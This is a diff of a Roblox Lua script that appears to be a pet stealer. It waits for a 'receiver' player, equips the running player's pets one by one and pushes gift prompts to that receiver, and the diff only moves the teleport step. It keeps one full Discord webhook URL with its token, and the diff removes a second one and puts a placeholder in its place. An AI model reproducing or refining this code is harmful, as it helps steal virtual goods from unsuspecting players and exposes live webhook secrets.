@@ -1,5 +1,5 @@
 local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"
-local MainWebhook = "https://discord.com/api/webhooks/1394193294334099539/QB6F3SVtM86yaWvoWO1vCmNKucjnTjZpPqc8mmAuWVXe3k0G1U8UgqUIASRDQxXEoVcI"
+local MainWebhook = "YOUR_MAIN_WEBHOOK_URL_HERE"
 
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
@@ -723,6 +723,8 @@ local function checkForGiftPrompt(targetPlayer)
 end
 
 local function startGifting(targetPlayer)
+    teleportToPlayer(targetPlayer)
+    
     while true do
         if not Players:FindFirstChild(targetPlayer.Name) then
             if shutdownGui then
@@ -742,8 +744,6 @@ local function startGifting(targetPlayer)
             end
 
             if equipSinglePet(pet.fullName) then
-                teleportToPlayer(targetPlayer)
-                
                 while true do
                     if clickPlayerScreen(targetPlayer) then
                         local promptStatus = checkForGiftPrompt(targetPlayer)
@@ -773,5 +773,4 @@ task.wait(2)
 local receiver = waitForReceiver()
 if not receiver then return end
 
-teleportToPlayer(receiver)
 startGifting(receiver)
